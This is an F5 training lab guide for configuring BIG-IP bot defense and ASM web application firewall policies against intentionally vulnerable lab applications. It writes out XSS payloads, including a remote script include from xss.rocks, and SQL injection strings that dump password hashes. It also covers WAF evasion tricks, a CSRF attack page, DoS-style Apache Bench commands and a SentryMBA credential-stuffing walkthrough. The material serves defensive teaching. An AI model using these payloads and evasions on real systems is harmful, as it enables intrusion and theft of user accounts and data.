Participant Hands-on Lab Guide

|image0|

    Last Updated: *04.2017*

©2016 F5 Networks, Inc. All rights reserved. F5, F5 Networks, and the F5
logo are trademarks of F5 Networks, Inc. in the U.S. and in certain
other countries. Other F5 trademarks are identified at f5.com.

Any other products, services, or company names referenced herein may be
trademarks of their respective owners with no endorsement or
affiliation, express or implied, claimed by F5.

These training materials and documentation are F5 Confidential
Information and are subject to the F5 Networks Reseller Agreement. You
may not share these training materials and documentation with any third
party without the express written permission of F5.

    \ **Table of Contents**

Lab Environment and Setup 3

Lab 1 – Bot Signatures and Proactive Bot Defense 4

Exercise 1 – Bot Signatures 4

Step 1 – Configure DoS Profile 4

Step 2 – Launch and Observe Simple Bot Attacks 5

Exercise 2 – Custom Bot Signatures 6

Step 1 – Unknown “Bot” Attack 6

Step 2 – Custom Bot Signature 6

Step 3 – Run the Unknown “Bot” Attack Again 7

Exercise 3 – Proactive Bot Defense 8

Step 1 – Enable Proactive Bot Defense 8

Step 2 – Launch and Observe Attack 9

Exercise 4 – Blocking and Validating Suspicious Browsers 10

Step 1 – Edit DoS Profile 10

Step 2 – Launch and observe attack. 11

Exercise 5 – Blocking Credential Stuffing with Proactive Bot Defense 13

Step 1 – Review Sentry MBA Config 13

Step 2 – Launch a Cred Stuffing attack 16

Step 3 – Block SentryMBA with Proactive Bot Defense 19

Lab 2 – Evasion Techniques 21

Exercise 1: Setup and Determining Vulnerability 21

Step 1 - Burp Suite Proxy 21

Step 2 - Create Policy 21

Step 3 - Determining Cross Site Script (XSS) Vulnerability 22

Exercise 2: Testing ASM with Evasion Techniques 25

Step 1 – Testing the XSS through ASM 25

Step 2 – Obfuscation – URL Encoding 26

Step 3 – Obfuscation – String Manipulation 30

Lab 3 - Cross Site Request Forgery Protection 34

Exercise 1 – Review CSRF Attack Page 34

Step 1 – Login 34

Step 2 – Configure CSRF Protection 36

Step 3 – Inspect CSRF Protection 37

Lab 4 - Protecting JSON applications with ASM 40

Exercise 1 – Review JSON App 40

Step 1 – Review JSON POST in Burp Suite 40

Exercise 2 – Manipulate JSON Request data 42

Step 1 – Change credentials 42

Step 2 – SQL Injection 44

Exercise 3 – Blocking malicious JSON with ASM 45

Step 1 – Create and Apply an ASM policy 45

Step 2 – Re-try SQL Injection 46

Exercise 4 – ASM Content Profiles 48

Step 1 – Review JSON Content Profile 48

Step 2 – Enforce signatures and re-try SQLi Attack 49

Exercise 5 – JSON Format Validation 51

Step 1 – Attempt a XSS Attack 51

Lab 5 - Websocket Protection 52

Exercise 1 – Review TaxiApp and F5 Config 52

Step 1 – Associate WebSocket Profile 52

Step 2 – Review TaxiApp 53

Step 3 – Attack TaxiApp 54

Exercise 2 – WebSocket Protection 55

Step 1 – Create ASM WebSocket Policy 55

Lab 6 – ASM Learning (Optional Exercise) 58

Exercise 1 – Policy Creation 58

Step 1: Create policy for Hackazon 58

Step 2: Review the Hackazon Virtual Security Tab config 58

Step 3: Create and Configure Learning Suggestions 59

Exercise 2: Server Technologies 62

Step 1: Review ASM Learning 62

Step 2: Review Learning Suggestions 64

Lab Environment and Setup
=========================

    **IMPORTANT: When you are completing these exercises, to ensure
    consistent lab behavior:**

    **- Use Chrome to manage the BIG-IP **

    **- Use Firefox for all application interactions.**

Lab 1 – Bot Signatures and Proactive Bot Defense
================================================

The purpose of this lab is to help you understand the bot detection and
mitigation features in Application Layer DoS Profiles. Also, to see the
new bot logging features in 13.0. You will detect and block bots with
increasing sophistication. You will also Use SentryMBA to perform a
credential stuffing attack and then block it.

Exercise 1 – Bot Signatures
---------------------------

Step 1 – Configure DoS Profile
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Create a DOS Profile** so that only Bot Signatures are enabled. Ensure
that ALL other features are disabled. Associate this profile to the DVWA
Protected VIP (10.1.10.56).

|image1|

Step 2 – Launch and Observe Simple Bot Attacks
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. On the Windows client open a command line and change to the
   **c:\\xampp\\apache\\bin** directory

|image2|

1. Use Apache Bench to “attack” the website. Run the following command:

ab -c 10 -n 1000 -r http://10.1.10.56/

1. 3. On the BIGIP, go to Security >> Event Logs >> Bot Defense >>
   Requests.

Note: When viewing the Bot Defense logs you will need to scroll to the
right to see some of the fields shown in the screenshots.

|image3|

In the Bot Defense logs we can see exactly WHO was blocked, HOW they
were blocked, and WHY they were blocked. This level of logging was only
available via iRules in previous versions and gives much greater
visibility into Bot Defense mitigations.

This is a “simple bot” and the DoS Profile was able to identify and
block the bot based on its signature, “ab” in the User-Agent HTTP
header. In the next exercise, we will change the User-Agent header and
see if the DoS Profile can block it.

Exercise 2 – Custom Bot Signatures
----------------------------------

Step 1 – Unknown “Bot” Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. From the Windows command line, run the following command:

ab -c 100 -n 1000 -r -H "User-Agent: kalakalazoomzoom"
http://10.1.10.56/

Note: Make sure to copy the entire command and issue all on one line.

1. Watch the Bot Defense Logs.

Step 2 – Custom Bot Signature
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. On the BIGIP, go to **Security ›› Options ›› DOS Protection ›› Bot
   Signatures** List

2. Click **Create**. On the Create New Bot Signature page, create a new
   bot signature with the following settings:

    **Name:** kalakalazoomzoom

    **Category:** DOS Tool

    **User-agent: contains:** kalakalazoomzoom

    |image4|

Step 3 – Run the Unknown “Bot” Attack Again
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. From the Windows command line, run the following command:

ab -c 100 -n 1000 -r -H "User-Agent: kalakalazoomzoom"
http://10.1.10.56/

Make sure to copy the entire command and issue all on one line.

1. Return to the Bot Defense logs. Is the attack blocked this time?

|image5|

1. We can see that the “bot” was blocked because it matched the new
   custom signature.

Exercise 3 – Proactive Bot Defense
----------------------------------

Step 1 – Enable Proactive Bot Defense
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. **On the BIGIP**, go to **Security ›› DOS Protection ›› DOS
   Profiles.** Edit your DoS Profile to enable Proactive Bot Defense.
   Set the Operation Mode to **Always** and clear the **Block Suspicious
   Browsers** box. (We will use that in the next exercise.)

|image6|

Step 2 – Launch and Observe Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. Open the Real-Time Charts Window.

2. **Run the following command** from the Windows command line:

ab -c 100 -n 1000 -r -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64;
rv:40.0) Gecko/20100101 Firefox/40.1" http://10.128.10.40/

1. **Review the Bot Defense logs**. Which mitigation is being used?

    |image7|

    The DoS Profile responded to the “bot” with a JS challenge. Note the
    “Reason” field. This field gives descriptive explanation for why a
    challenge was (or was not) possible. Proactive Bot Defense stops
    simple bots, even if they are trying to impersonate legitimate
    browsers with a valid User-Agent header, by responding with a
    JavaScript challenge.

**
**

Exercise 4 – Blocking and Validating Suspicious Browsers
--------------------------------------------------------

Step 1 – Edit DoS Profile
~~~~~~~~~~~~~~~~~~~~~~~~~

1. **On the BIGIP**, go to **Security ›› DOS Protection ›› DOS
   Profiles.** Edit the **Agility\_DOS\_Profile** to enable Block
   Suspicious Browsers and CAPTCHA Challenge. Click **Update**.

    |image8|

Step 2 – Launch and observe attack.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You will use your browser to act as a JS-enabled bot that is
impersonating a legitimate browser.

1. **On the BIGIP**, open **the Real-Time Charts Window.**

2. **Open a new Private Window in Firefox.** From the new User-Agent
   Switcher tool in the top right corner of the Firefox menu choose
   Safari and OS X.

    |image9|

    This will force Firefox to send a User-Agent header that looks like
    it is coming from Safari on an Apple computer even though we are
    actually using Firefox on a Windows computer.

1. **In the browser address bar enter** http://10.1.10.56/dvwa/ to try
   to access the DVWA site. You will be presented with a CAPTCHA
   Challenge. Fill out the CAPTCHA and click **Submit**. You are allowed
   through to the Auction Website.

    |image10|

1. Look at the Bot Defense logs.

    |image11|

    Proactive Bot Defense initially responded with the JS Challenge
    which the browser (and any JS-enabled bot) was able to pass. The DOS
    Profile then sent the Client Capabilities challenge to validate the
    browser was really Safari running on Mac OS X (since this is what
    the user-agent header indicated). The response received by the BIGIP
    is given a score.

    **Client Capabilities Scores**

    **0 – 59** = Browser = **Allowed**

    **60 – 99** = Suspicious = **CAPTCHA Challenge**

    **100** = BOT = **Blocked**

    The browser received too high of a score and so was presented with
    the CAPTCHA Challenge.

    The CAPTCHA Challenge will block even JS-enabled bots (AKA headless
    browsers) but still let legitimate human users access the site.
    Additionally, the CAPTCHA will only be presented if/when a browser
    does not pass the capabilities challenge. Most browsers will pass
    this challenge with a low enough score that most users will NOT even
    see the CAPTCHA.

Exercise 5 – Blocking Credential Stuffing with Proactive Bot Defense
--------------------------------------------------------------------

Step 1 – Review Sentry MBA Config
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    SentryMBA is a tool that “crackers” use to try to replay stolen
    credentials against login pages that they want to compromise. As you
    will see from this lab it is highly configurable and it is widely
    used on the internet for credential stuffing attacks.

1. **On the Windows client**, open the Sentry MBA tool by clicking the
   blue “S” logo in the taskbar.

    |image12|

    SentryMBA is already configured to attack the Hackazon login page.
    We will take a look at the tool settings to see how it is
    configured.

1. For this lab, SentryMBA is configured to use the Burp Proxy. You will
   learn more about Burp Proxy in another lab. For now, open Burp proxy
   and ensure that Intercept is off.

   |image13|

2. From the Site dropdown box, make sure that “hackazon.f5demo.com” is
   selected.

    |image14|

1. From the Settings section of the left menu, select HTTP Header. Then
   click on the “Magic Wand” icon in the lower right corner.

    |image15|

1. This will open the main configuration wizard page.

   -  Review the configuration and mouse over some of the fields to see
      the context-specific help. DO NOT change any settings.

   -  Close the page with the X in the top right corner.

    |image16|

1. Now Click on Lists in the left menu and select Word Lists.

    Here you can see the username:password credentials that will be
    “stuffed” into the DVWA login page. In practice, these might be tens
    of thousands of stolen credentials from breaches like the Sony,
    Target, Home Depot, or Yahoo breaches.

    |image17|

Step 2 – Launch a Cred Stuffing attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. Launch the attack by clicking the Go!! Button in the top left corner.
   In the pop-up, check the **Reset WordList** box (if available) and
   click **Start Bruteforcer** **Engine** and then click Yes in the
   proxy warning window.

|image18|

|image19|

1. The attack will start and you will quickly see in the Progression tab
   that a login was successful using the admin:admin and user1:user1
   credentials from the wordlist.

|image20|

1. Once you see the successful login click Abort in the top left. Then
   expand the History section of the left menu and click History.

    |image21|

1. In the History list right click on the successful login and choose
   **Launch in Browser**.

You can see how easy SentryMBA makes it to use, find, and exploit stolen
credentials.

    |image22|

1. In preparation for the next step, clear the successful logins from
   the history by click the red X in the bottom right and deleting
   **Delete Selected Hits**.

    |image23|

Step 3 – Block SentryMBA with Proactive Bot Defense
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We will now run apply a Proactive Bot Defense policy to the Hackazon
virtual to see if Proactive Bot Defense can stop this sophisticated
tool.

1. In Chrome go to the Security tab for the Hackazon\_protected\_virtual
   and assign the Hackazon-PBD Dos profile.

   |image24|

2. In SentryMBA, ensure the Site dropdown is set to
   **http://hackazon.f5demo.com**.

    |image25|

1. Click Go!! To start the attack and watch the Progession window.

2. In the F5 WebUI go to the Bot Defense logs.

    |image26|

Lab 2 – Evasion Techniques
==========================

The purpose of this lab is to introduce common penetration testing
techniques and show how ASM signatures, normalization engine, and
protocol validation handle evasion techniques. You will also use Burp
Suite to view, manipulate, and replay requests and attacks.

Exercise 1: Setup and Determining Vulnerability
-----------------------------------------------

Step 1 - Burp Suite Proxy
~~~~~~~~~~~~~~~~~~~~~~~~~

1. View Proxy tab and settings

2. Ensure that Intercept is OFF

|image27|\ Step 2 - Create Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Use the following settings:

1. Advanced View

2. Name: DVWA-Evasion

3. Policy Template: Comprehensive

4. Virtual Server: DVWA\_protected

5. Lang: utf-8

6. Enforcement Readiness: 0 days

Step 3 - Determining Cross Site Script (XSS) Vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In Firefox browse to http://unprotected.f5demo.com/dvwa/

   a. Login as admin/admin

   b. Click on XSS Reflected in Left side menu

   c. |image28|

2. Enter Basic XSS Locator

   a. In the “What is your name?” field enter your name. Note that the
      name you entered is shown in the response. This is known as
      “reflection”; user input is shown, or reflected, in the response.

   b. Now enter this common XSS string that is used to determine if a
      site is vulnerable to XSS:

    '';!--"<F5ROCKS>=&{()}

    | **'';!--"<XSS>=&{()}**
    | This is a common string used to test what, if any, filters and/or
      encoding are being used on user input. Typically, the source of
      the page after this injection will contain either &lt;XSS or <XSS.
      If the second is found, the application is most likely not
      filtering user input (as it allowed the addition of an arbitrary
      tag) and is likely vulnerable to XSS.

a. Note that the visible response does not reflect the string “<F5ROCKS”
   and does not APPEAR to show vulnerability. But let’s view the page
   source to be sure.

   |image29|

b. Right click on the webpage and choose View Page Source.

c. On the view source tab, press ctrl+F to open the inline search bar.
   Search for “F5ROCKS”.

    |image30|

a. The presence of “<F5ROCKS” in the page source is an indicator that
   the page is not filtering user input and is likely vulnerable to XSS.

1. Try these other common XSS locator strings and note the results.
   These XSS strings are used by Pen Testers to determine if a given
   application is susceptible to XSS.

    **';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
    alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
    ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>**

    This is actually a combination of several injection attempts:

    **The First Injection**

    ';alert(String.fromCharCode(88,83,83))//

    This injection attempts to terminate a JavaScript string literal
    (using '), then terminate the statement (with ;) and makes a call to
    alert(String.fromCharCode(88,83,83)) which will cause a popup box
    containing "XSS". The following // is an attempt to "comment out"
    the rest of the statement, so that a syntax error will not occur and
    the script will execute.

    **The Second Injection**

    ";alert(String.fromCharCode(88,83,83))//

    **Like the first injection, but it uses " in an attempt to terminate
    a JavaScript string literal.**

    **The Third Injection**

    --></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

    This attempts to do the following things:

-  Terminate an HTML (or XML) comment (with -->)

-  Terminate an existing <SCRIPT> tag using </SCRIPT>

-  This is done to prevent the injected script causing a syntax error,
   which would prevent the injected script from executing.

-  Terminate an HTML attribute and tag, using ">

-  Terminate an HTML attribute and tag, using '>

-  Inject JavaScript using
   <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

    **<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>**

    This is a standard JavaScript injection that is calling a remote .js
    file.

Exercise 2: Testing ASM with Evasion Techniques
-----------------------------------------------

Step 1 – Testing the XSS through ASM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In Firefox browse to http://protected.f5demo.com

   a. Login as admin/admin

   b. Click on XSS Reflected in Left side menu

2. Enter the XSS Locator string in the “What’s your name?” field and
   click Submit:

    ;alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
    alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
    ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

1. In Chrome, review the ASM logs for this request. |image31|

2. Enter the remote xss.js script and click submit:

    <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

1. Review the ASM logs.

    |image32|

Step 2 – Obfuscation – URL Encoding
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    One form of obfuscation is encoding the attack to “hide” it from
    protections like IPS and WAF. In this step we will try URL-encoding.

1. Enable intercept on Burp Proxy, by selecting the Proxy tab and
   clicking the “Intercept is off” button. It should now say “Intercept
   is on.” Requests from FF will now be held in Burp for review and
   possible manipulation.

    |image33|

1. In Firefox submit the remote xss.js script again.

    <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

1. Manipulate the request in Burp Proxy.

   a. In the Burp Proxy Request window select entire parameter value,
      right-click, and select Send to Decoder

    |image34|

a. In Decoder tab, from right hand menu select Encode as… URL

    |image35|

a. Select and copy the URL-encoded string (You will need to use Ctrl+C
   to copy the string)

    |image36|

a. Return to the Proxy tab, select the entire parameter value and
   replace it with the copied URL-encoded string

    |image37|

a. Click forward. (You may need to click forward a few more times if
   subsequent requests are generated to load this page).

1. View the DVWA page in FF to see if the XSS was successful.

2. This same obfuscation technique could be accomplished without Burp by
   simply editing the query string parameter value directly in the
   browser address bar. Try it.

3. Review the ASM logs.

Step 3 – Obfuscation – String Manipulation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Another form of obfuscation is string manipulation. In this
    exercise, we will try manipulating common XSS and SQLi attack
    strings to evade signature-based detections.

1. **Null character insertion**

   a. Ensure Burp intercept is on.

   b. | Send the XSS script again.
      | <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

   c. In Burp Intercept, insert a URL-encoded null character (%00) in
      the middle of the beginning and ending script tags.

|image38|

1. **SQLi Always True
   **\ You should be familiar with the common “OR 1=1” SQLi injection
   attack. This is a common attack that attempts to create an “always
   true” condition that will cause the database to return more rows than
   the application intended.

   a. Ensure Burp Intercept is turned off

   b. In Firefox go to the SQLi Injection page.

   c. | Enter the following string in the User ID field and click
        Submit.
      | ' OR 1=1#

   d. Review the ASM Request log:

      i.  What signatures fired for this request?

      ii. Note each of the Signature IDs that fired. There may be more
          than one.

    |image39|

a. | Let’s try a less obvious “always true” string and see if ASM
     catches it. In the User ID field enter the following string and
     click Submit.
   | ' OR ASCII('\*')>'40
   | This is essentially comparing the ASCII representation of the
     asterisk (\*) character (which is 42) with the decimal number 40.
     Note we used a greater than comparison rather than an equality
     comparison.

b. Review the ASM Request log

   i.   What signatures fired for this request?

   ii.  Note the Signature IDs that fired. Are they the same as the
        previous request?

   iii. What does this tell you about ASMs signatures and normalization
        engine?

1. **SQLi Union Select
   **\ In this exercise we will try a more sinister Union Select command
   that returns all of the usernames and their hashed passwords. We will
   then try to manipulate the command to evade signature detection.

a. Ensure Burp Proxy is disabled.

b. In Firefox, return to the DVWA SQL Injection page.

c. In the User ID field enter the following string and click Submit:

' and 1=0 union select null,
concat(first\_name,0x0a,last\_name,0x0a,user,0x0a,password) from users #

|image40|

    You can see that all user names and their hashed passwords are
    returned.

a. Review the ASM Request Log.

   a. What signatures fired?

   b. Note the Signature IDs that were matched. There may be more than
      one.

b. | Return to DVWA in Firefox and enter the following string and click
     Submit:
   | ' and 1=0 un/\*\*/ion/\*\*/sel/\*\*/ect null,
     concat(first\_name,0x0a,last\_name,0x0a,user,0x0a,password) from
     users #

    This string is trying to hide the union select command by inserting
    SQL comments between and in the middle of the words.

a. Review the ASM Request Log.

   a. What signatures fired?

   b. Note the Signature IDs that were matched. There may be more than
      one.

   c. How do these signatures compare to those matches in the previous
      request?

b. | Return to DVWA in Firefox and enter the following string and click
     Submit:
   | ' and 1=0 REVERSE(noinu) REVERSE(tceles) null,
     concat(first\_name,0x0a,last\_name,0x0a,user,0x0a,password) from
     users #

    This string is trying to hide the union select command by using the
    SQL REVERSE function.

a. Review the ASM Request Log.

   a. What signatures fired?

   b. Note the Signature IDs that were matched. There may be more than
      one.

   c. How do these signatures compare to those matches in the previous
      request?

Lab 3 - Cross Site Request Forgery Protection
=============================================

The purpose of this lab is to show in detail how ASM mitigates CSRF
attacks. You will perform a CSRF attack and compare how requests and
responses differ with and without ASM protection.

Exercise 1 – Review CSRF Attack Page
------------------------------------

Step 1 – Login
~~~~~~~~~~~~~~

1. Ensure that Burp Proxy is running and Intercept is off.

2. In Firefox, login to http://unprotected.f5demo.com as admin/admin.

3. In another Firefox tab, browse to the attacker page at
   http://www.badkitties.com. Click on the word Demo to open the attack
   page.

|image41|\ |image42|

    This is a (ridiculously) simple webpage that has two links, Good
    Kitty and Bad Kitty. Bad Kitty is a CSRF link to the unprotected
    DVWA URL. Good Kitty is a CSRF link to the protected DVWA URL.

    This is intended to mimic a real-word malicious page/link that sends
    a request to another URL where the user MAY be authenticated,
    executing an action the user did not intend; a CSRF attack.

1. Click on the Bad Kitty link.

2. In the DVWA browser tab, logout and then try to log back in as
   admin/admin.

3. On the Attack page mouse over the Bad Kitty link and see if you can
   tell to what the admin password was changed.

4. Login as admin and change the password back to “admin”.

Step 2 – Configure CSRF Protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In Chrome, edit the DVWA-Evasion ASM policy to enable CSRF protection
   for the DVWA Change Password page.

    |image43|

1. Change the DVWA-Evasion policy to Blocking mode.

2. In Firefox, login to http://protected.f5demo.com as admin/admin.

3. Click on the Bad Kitty link.

    |image44|

In the next step, we will look at the differences between the protected
and unprotected Change Password pages.

Step 3 – Inspect CSRF Protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In Firefox, open two tabs and login to both the protected and
   unprotected DVWA sites as admin/admin. Browse to the Change Password
   page in each window by clicking on the CSRF link in the right-hand
   menu.

2. Right click on the Change button and choose Inspect Element source.

    |image45|

1. Do the same to inspect the elements for the protected DVWA page.

    |image46|

    Note the Cross Site Request Token (csrt) injected into the page by
    ASM.

1. In the developer tools window, change to the Network tab and click
   the trash can icon to delete any requests that are already showing.

    |image47|

1. Enter “password” into the password fields to change the admin
   password. Click Change.

2. In the developer tools window click on the first GET request and on
   the right select the Params tab.

    |image48|

1. Login and open this same page in Chrome. Inspect the DOM. And note
   the CSRT value.

    |image49|

Lab 4 - Protecting JSON applications with ASM
=============================================

The purpose of this lab is to show ASM’s ability to parse and protect
JSON data.

Exercise 1 – Review JSON App
----------------------------

Step 1 – Review JSON POST in Burp Suite
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. Open Firefox and Burp. In Burp, go to the Proxy tab and turn
   Intercept off.

    |image50|

1. In Firefox browse to http://simplestore.f5demo.com and click on the
   Login tab.

    |image51|

    We will now use Burp to intercept, view, and manipulate the POSTs to
    the login page.

1. Go to Burp and enable intercept. Then try to login to the Simple
   Store app in Firefox as user/user. This request will be intercepted
   by Burp. Return to the Burp window and view the request.

    |image52|

    You should notice that:

-  POST data is not in typical key/value pairs. The POST data is in JSON
   format.

-  The Content-Type “application/json”.

1. Click Forward to forward the request on to the site. Return to
   Firefox to see if you were authenticated.

Exercise 2 – Manipulate JSON Request data
-----------------------------------------

Step 1 – Change credentials
~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In Firefox try to login again as user/user. Return to Burp Intercept
   and right click on the request and choose Send to Repeater. Then
   click on the Repeater tab.

    |image53|

In Burp Repeater we can manipulate and resend this request many times
and see the responses.

1. Change the username and password JSON parameter values to test/test.
   Click Go to send the request. You should see from the response that
   we successfully logged in with these credentials.

    |image54|

Step 2 – SQL Injection
~~~~~~~~~~~~~~~~~~~~~~

1. In Burp Repeater, change the username parameter value to: **‘ OR
   1=1#**. Then click Go to send the request.

|image55|

    From looking at the response it does not appear that this page is
    susceptible to this specific SQLi attack. But the application did
    receive and try to process the JSON parameters. We could continue to
    try various attacks against this and other pages in this web
    application.

    A WAF will not be able to apply signatures to these parameter names
    and values and protect this application unless it is able to
    properly parse the JSON format and differentiate between the
    parameter name and the parameter value.

    In the next exercise, we will apply an ASM policy that is able to
    parse these JSON parameters and protect this application.

Exercise 3 – Blocking malicious JSON with ASM
---------------------------------------------

Step 1 – Create and Apply an ASM policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. Create an ASM policy with the following settings:

|image56|

The ASM policy is now applied to the JSON virtual. Note that we did NOT
make any JSON-specific changes to the policy.

Step 2 – Re-try SQL Injection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In Burp Repeater, send the SQLi request again. Look at the response.

    |image57|

1. In The F5 WebUI, look at the ASM Request Log. (Be sure to REMOVE the
   filter for illegal requests.)

    |image58|

    ASM was able to parse the JSON parameters and identify the request
    as malicious. However, it did not block the request because the
    signatures are in staging. In the next exercise will will look at
    why and how ASM was able to parse the JSON parameters and then
    enforce the signature(s) to block this request.

Exercise 4 – ASM Content Profiles
---------------------------------

Step 1 – Review JSON Content Profile
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. **On the BIGIP**, go to **Security ›› Application Security ›› Content
   Profiles ›› JSON Profiles.** Click on the Default Profile. Here you
   can see that there is a Default JSON profile that allows ASM to
   validate JSON format and check the parameter names and values against
   signatures.

    |image59|

    |image60|

Step 2 – Enforce signatures and re-try SQLi Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In the F5 WebUI, go to **Application Security ›› Policy Building ››
   Traffic Learning**.

2. In the **Enforcement Readiness Summary** section, click on the number
   indicating the number of signatures that have suggestions but are not
   enforced.

    |image61|

1. On the **Attack Signatures** page, select all three signatures and
   click Enforce. Click Apply Policy to apply these changes.

    |image62|

1. Return to Burp Repeater and resend the SQLi attack by clicking Go.
   Note the response. Was the request blocked?

    |image63|

1. On the F5 WebUI, return to the ASM Request Log and view this request.
   What indicators are there that the request was blocked?

    |image64|

1. Clear the Request Log.

Exercise 5 – JSON Format Validation
-----------------------------------

Step 1 – Attempt a XSS Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In Burp Repeater, enter the following XSS attack as the username
   parameter value and click Go:

<script>window.alert("You have been hacked!!!");</script>

    Was the Request blocked?

|image65|

1. Review this request in the ASM Request log. Why was this request
   blocked? Besides the XSS signatures, what other violation(s) fired?

|image66|

    We can see that not only were the XSS signatures were matched but
    also that ASM is validating correct JSON formatting. This a
    “positive security model” function would help catch zero-day or
    obfuscated attacks that may NOT trigger a signature.

Lab 5 - Websocket Protection
============================

The purpose of this lab is to show the ability of ASM to support, parse,
and protect applications that use WebSockets to transmit data.

Exercise 1 – Review TaxiApp and F5 Config
-----------------------------------------

Step 1 – Associate WebSocket Profile
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In Chrome, In the F5 WebUI open the Websocket\_virtual properties
   page.

2. Ensure that Advanced view is set and associate the default WebSocket
   profile to the virtual. Click .

|image67|\ |image68|

    In order for ASM to properly parse the WebSocket content, a
    websocket profile must be assigned to the virtual.

Step 2 – Review TaxiApp
~~~~~~~~~~~~~~~~~~~~~~~

1. In Firefox, browse to `www.taxiapp.com <http://www.taxiapp.com>`__.
   Click on the Admin tab and login as admin/admin.

    |image69| |image70|

    This is the admin console of the Taxi app and allows the app admin
    to see what clients and drivers are using the app.

1. On the Desktop, open the TaxiApp client emulator by double-clicking
   the icon.

    |image71|

1. In the TaxiApp client emulator, click on the Client tab and enter
   your name. Click Order.

    |image72|

    The TaxiApp client passes data to the backend application over a
    WebSocket connection. You should see your name and a location appear
    in the admin console of the taxi app.

Step 3 – Attack TaxiApp
~~~~~~~~~~~~~~~~~~~~~~~

1. In the TaxiApp client, enter the following XSS attack string in the
   Name field. Click Order.

    <img src=/ onerror=alert(0xF5)>

|image73|\ |image74|

**
**

Exercise 2 – WebSocket Protection
---------------------------------

Step 1 – Create ASM WebSocket Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. In Chrome, In the F5 WebUI create a new ASM policy with the following
   settings:

    |image75|\ Name: Websocket-policy

    Policy Template: Rapid Deployment

    Virtual Server: Websocket\_virtual

    Learning: Disabled

    Enforcement: Blocking

    Language: utf-8

    Signature Staging: Disabled

1. In the TaxiApp client, enter the following XSS attack string in the
   Name field. Click Order.

    <img src=/ onerror=alert(0xF5)>

|image76|

1. Review the ASM Request Log for this request.

    |image77|

1. Look at the request immediately prior to this websocket request.

    |image78|

Lab 6 – ASM Learning (Optional Exercise)
========================================

The purpose of this lab is to introduce new features and changes to
learning in ASM in 13.0. This lab only focuses on Server Technology
Learning. There are MANY more new enhancements to ASM Learning in 13.0.
A separate lab will be created in the future to demo all of these
features.

Exercise 1 – Policy Creation
----------------------------

|image79|\ Step 1: Create policy for Hackazon
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. Advanced mode

2. Name: ASM\_Learning

3. Policy Template: Comprehensive

4. Associate to Hackazon VIP

5. Learning Mode: Manual

6. Enforcement Mode: Blocking

7. Language: utf-8

8. Enforcement Readiness: 0

Step 2: Review the Hackazon Virtual Security Tab config
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    |image80|\ Ensure App Sec logging profile is assigned to VIP.

**
**

Step 3: Create and Configure Learning Suggestions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. |image81|\ Review Learning and Blocking Settings:

   a. Ensure that Advanced view is selected

   b. Expand Options section at bottom

2. Go to Traffic Learning page:

   a. No Learning Suggestions yet as policy has seen no traffic.

   b. Also, note the number of signatures applied to the policy

|image82|

**
**

1. Browse to http://hackazon.f5demo.com

   a. Click the Hackazon logo to refresh the home page

   b. Click on any item on the home page

|image83|

a. Change “Count” to 2 and click Add to Cart.

|image84|

a. In the Cart pop-up, click Show all Items in Cart

|image85|

a. On the Overview screen accept the defaults and click Next.

|image86|

a. On the Shipping Address screen complete the form and click Next

|image87|

a. On the Billing Address screen click Bill to this Address

Exercise 2: Server Technologies
-------------------------------

Step 1: Review ASM Learning
~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. Return to the ASM WebUI and navigate to the Traffic Learning page

2. Refresh page if the browser was already at this page

3. Note Server Technologies learned and, again, note the number of
   signatures

|image88|

1. Accept all four Add Server Technologies suggestions and click Apply
   Policy

